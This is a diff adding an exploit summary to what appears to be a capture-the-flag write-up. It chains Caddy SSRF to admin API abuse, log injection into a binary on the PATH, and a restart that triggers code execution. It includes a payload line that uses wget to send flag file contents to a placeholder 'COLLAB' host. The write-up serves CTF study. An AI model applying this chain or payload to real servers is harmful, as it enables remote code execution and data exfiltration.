@@ -1,5 +1,24 @@
 ## Proxy
 
+## Exploit Summary
+The exploit chain leverages Caddy's admin API to achieve RCE and flag exfiltration:
+
+1. Arbitrary SSRF
+- The initial Caddy configuration allows arbitrary SSRF via the reverse_proxy handler. This enables access to internal services like the admin API on `127.0.0.1:2019`.
+
+2. Admin API Abuse
+- The `/load` endpoint allows dynamic configuration changes without server restart. 
+- We configure logging to write logs to `/usr/sbin/caddy` (earlier in `$PATH` than the real binary)
+- Set permissions to `0777` (executable)
+
+3. Log Injection to RCE
+- Use console format for cleaner output
+- Trigger a 404 error with a malicious URL containing: Newline characters (`%0A%0D`) to break log formatting
+- Pipeline to decode Base64-encoded payload and execute: `echo <b64>chmod 777 /flag.sh; wget https://COLLAB/?a=$(cat /flag.sh|base64)</b64> | base64 -d | sh`
+
+4. Restart Server to Trigger
+- Stop Caddy via `/stop` admin endpoint, causing the container's restart loop to execute our malicious `/usr/sbin/caddy` script.
+
 ### Task intro
 Description of the task:
 ```
